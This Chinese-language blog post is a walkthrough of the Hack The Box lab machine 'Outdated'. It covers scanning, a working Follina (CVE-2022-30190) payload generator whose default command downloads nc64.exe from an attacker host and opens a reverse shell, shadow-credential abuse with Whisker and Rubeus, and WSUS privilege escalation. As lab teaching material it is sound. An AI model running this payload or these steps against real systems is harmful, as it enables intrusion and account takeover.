---
layout: post
title: HTB——Outdated
---

![01](C:\Users\GAiLO\Pictures\blog图片\HTB\Outdated\01.png)

# 0x01 信息收集

```bash\
 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.7  Expired: 2026.01.01
[15:53:38] [INFO] Start IpScan:10.129.155.118
[15:53:38] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[15:53:38] [+] 10.129.155.118:25 open
[15:53:38] [+] 10.129.155.118:139 open
[15:53:38] [+] 10.129.155.118:88 open
[15:53:38] [+] 10.129.155.118:135 open
[15:53:38] [+] 10.129.155.118:53 open
[15:53:39] [+] 10.129.155.118:464 open
[15:53:39] [+] 10.129.155.118:593 open
[15:53:39] [+] 10.129.155.118:445 open
[15:53:39] [+] 10.129.155.118:636 open
[15:53:39] [+] 10.129.155.118:389 open
[15:53:39] [+] [TCP/SMTP]   10.129.155.118:25 [220 mail.outdated.htb ESMTP]
[15:53:39] [INFO] start SMTP check 10.129.155.118:25
[15:53:39] [+] 开始 SmtpScan 任务: SMTP://10.129.155.118:25
[15:53:39] [+] [TCP/HTTP]  [([\d.]+)$| p 1.0] ncacn-http://10.129.155.118:593 [ncacn_http/1.0]
[15:53:39] [+] [TCP/NETBIOS]  [Microsoft Windows netbios-ssn] 10.129.155.118:139 [.]
[15:53:39] [+] [TCP/RPC]  [Microsoft Windows RPC] 10.129.155.118:135 [.@]
[15:53:39] [INFO] start WMI check 10.129.155.118:135
[15:53:39] [+] 开始 WmiExec 任务: WMI://10.129.155.118:135
[15:53:39] [+] [TCP/LDAP]   10.129.155.118:389 [0.a]
[15:53:39] [INFO] start LDAP check 10.129.155.118:389
[15:53:39] [+] 开始 LdapScan 任务: LDAP://10.129.155.118:389
[15:53:43] [+] [TCP/KPASSWD5]   10.129.155.118:464 
[15:53:43] [+] [TCP/MICROSOFT-DS]   10.129.155.118:445 
[15:53:43] [INFO] start SMB check 10.129.155.118:445
[15:53:43] [+] 开始 SmbScan 任务: SMB://10.129.155.118:445
[15:53:46] [+] [TCP/SPARK]  [Apache Spark] 10.129.155.118:88 [.]
[15:53:50] [+] 10.129.155.118:3268 open
[15:53:50] [+] 10.129.155.118:3269 open
[15:53:54] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.155.118:3268 [0.d.{.0.s0.domainFunctionality1.70.forestFunctiona]                                                     
[15:53:54] [INFO] start LDAP check 10.129.155.118:3268
[15:53:54] [+] 开始 LdapScan 任务: LDAP://10.129.155.118:3268
[15:53:59] [+] [TCP/SSL]   10.129.155.118:636 [.\.M.h O VO.k.l I.a.i.Qz.t.U x2 v.0 =+4./.0.0.]^.:]
[15:53:59] [INFO] start LDAPS check 10.129.155.118:636
[15:53:59] [+] 开始 LdapsScan 任务: LDAPS://10.129.155.118:636
[15:53:59] [+] 10.129.155.118:5985 open
[15:54:03] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.155.118:3269 [0.d.{.0.s0.domainFunctionality1.70.forestFunctiona]                                                     
[15:54:03] [INFO] start LDAP check 10.129.155.118:3269
[15:54:03] [+] 开始 LdapScan 任务: LDAP://10.129.155.118:3269
[15:54:07] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0][Microsoft HTTPAPI httpd 2.0] http://10.129.155.118:5985 [Not Found]
[15:54:07] [INFO] start WinRM check 10.129.155.118:5985
[15:54:07] [+] 开始 WinRMScan 任务: WinRM://10.129.155.118:5985
[15:54:08] [+] 10.129.155.118:8530 open
[15:54:08] [+] 10.129.155.118:8531 open
[15:54:11] [+] 10.129.155.118:9389 open
[15:54:16] [+] [TCP/HTTP] [200] [Microsoft-IIS/10.0][ASP][Microsoft IIS httpd 10.0] http://10.129.155.118:8530 [None]
[15:54:16] [+] [TCP/ADWS]   10.129.155.118:9389

┌──(root㉿kali)-[/home/kali/HTB/Outdated]
└─# nmap -A 10.129.155.118
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-26 15:57 EDT
Nmap scan report for 10.129.155.118
Host is up (0.17s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-26 21:32:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2025-04-26T21:14:50
|_Not valid after:  2026-04-26T21:14:50
|_ssl-date: 2025-04-26T21:34:25+00:00; +1h34m54s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-26T21:34:23+00:00; +1h34m54s from scanner time.
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2025-04-26T21:14:50
|_Not valid after:  2026-04-26T21:14:50
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-26T21:34:25+00:00; +1h34m54s from scanner time.
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2025-04-26T21:14:50
|_Not valid after:  2026-04-26T21:14:50
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-26T21:34:23+00:00; +1h34m54s from scanner time.
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Not valid before: 2025-04-26T21:14:50
|_Not valid after:  2026-04-26T21:14:50
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1h34m52s, deviation: 2s, median: 1h34m53s
| smb2-time: 
|   date: 2025-04-26T21:33:41
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   181.10 ms 10.10.16.1
2   181.21 ms 10.129.155.118

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.50 seconds
```

拿到了弱密码的SMB账密，当然是先尝试查看分享文件有哪些。

![02](C:\Users\GAiLO\Pictures\blog图片\HTB\Outdated\02.png)

接下来将`Shared`内的所有文件都薅出来看看。下载下来pdf文件后我们查看，能看到一些CVE报告与一个邮箱地址。

![03](C:\Users\GAiLO\Pictures\blog图片\HTB\Outdated\03.png)

---

# 0x02 CVE-2022-30190复现

依次查看，我们可以发现第一个CVE貌似符合我们的利用要求。使用下列脚本，我们生成一个恶意的html文件，并开启http服务来提供下载的同时开启反弹shell监听

```python
import base64
import random
import string
import sys

if len(sys.argv) > 1:
    command = sys.argv[1]
else:
    command = "IWR http://10.10.16.10:8089/nc64.exe -outfile C:\\programdata\\nc64.exe; C:\\programdata\\nc64.exe 10.10.16.10 18441 -e cmd"

base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")

# Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
html_payload += (
    "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
    + "\n</script>"
)

print(html_payload)
```

![04](C:\Users\GAiLO\Pictures\blog图片\HTB\Outdated\04.png)

接收端口与反弹端口使用80与443，前面使用自定义端口无法正常触发payload，怀疑为防火墙阻拦了未经授权的端口流量所致。反弹后我们查看当前用户为`btables`，首先查看此用户有无滥用的特权。

![06](C:\Users\GAiLO\Pictures\blog图片\HTB\Outdated\06.png)

可以查看到，`btables`用户对`sflowers`用户具有`AddKeyCredentialLink`权限。基于此特权，我们就要用的新的`ps1`脚本来进行操作

---

# 0x03 AddKeyCredentialLink获取证书

- [Leo4j/KeyCredentialLink: Add Shadow Credentials to a target object by editing their msDS-KeyCredentialLink attribute](https://github.com/Leo4j/KeyCredentialLink)

```bash
PS C:\Users\btables> Import-Module .\KeyCredentialLink.ps1
Import-Module .\KeyCredentialLink.ps1
PS C:\Users\btables> List-KeyCredentials -target "sflowers" -domain "outdated.htb" -dc "dc.outdated.htb"
List-KeyCredentials -target "sflowers" -domain "outdated.htb" -dc "dc.outdated.htb"
[-] DSInternals is not installed
[-] Please re-run with the -Install flag
PS C:\Users\btables> List-KeyCredentials -target "sflowers" -domain "outdated.htb" -dc "dc.outdated.htb" -Install
List-KeyCredentials -target "sflowers" -domain "outdated.htb" -dc "dc.outdated.htb" -Install
No KeyCredentials found for the target object
PS C:\Users\btables> Add-KeyCredentials -target "sflowers" -domain "outdated.htb" -dc "dc.outdated.htb" -Install
Add-KeyCredentials -target "sflowers" -domain "outdated.htb" -dc "dc.outdated.htb" -Install
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 77aa4a85-aa87-42b6-8ead-5276001f9fa7
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Saving the associated certificate to file...
[*] The associated certificate was saved to C:\Users\btables\cert.pfx
[*] The associated certificate password is P@ssw0rd!
[*] You can now run Rubeus with the following syntax:
Rubeus.exe asktgt /user:sflowers /certificate:C:\Users\btables\cert.pfx /password:"P@ssw0rd!" /domain:outdated.htb /dc:dc.outdated.htb /getcredentials /nowrap
```

再搭配`Rubeus.exe`即可获取到`sflowers`的NTLM了.tips:这里需要我们使用nc转发用powershell上线，cmd只能运行单条powershell语句，在执行完后我们的Import就失效了。止步于此，找的`ps1`项目在Rubeus时没办法触发，再尝试一下`Whisker.exe`来获取。

```bash
PS C:\Users\btables> .\Whisker.exe add /domain:outdated.htb /target:sflowers /dc:DC.outdated.htb /password:password
.\Whisker.exe add /domain:outdated.htb /target:sflowers /dc:DC.outdated.htb /password:password
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] Searching for the target account
[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 7ba41f4f-2737-423d-9b9e-bab96bbad790
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

.\Rubeus.exe asktgt /user:sflowers /certificate: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 /password:"password" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
```

获取到其base64格式的证书后，我们再次申请即可拿到sflowers的NTLM，我们使用winrm上线

![07](C:\Users\GAiLO\Pictures\blog图片\HTB\Outdated\07.png)

---

# 0x04 WSUS服务提权

我们开始尝试提权。先查看用户的所属用户组与权限。查看到此用户是`WSUS Administrators`组的。我们首先先探测一下内网的WSUS服务在哪里。

- [nettitude/SharpWSUS](https://github.com/nettitude/SharpWSUS)

编译项目完成后，使用exe来定位WSUS服务器的位置。

```powershell
*Evil-WinRM* PS C:\Users\sflowers\Documents> .\SharpWSUS.exe locate

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Locate WSUS Server
WSUS Server: http://wsus.outdated.htb:8530

[*] Locate complete
```

然后按项目实例一步一步复现，我们就可以成功获取到一个`Administrator`账户了。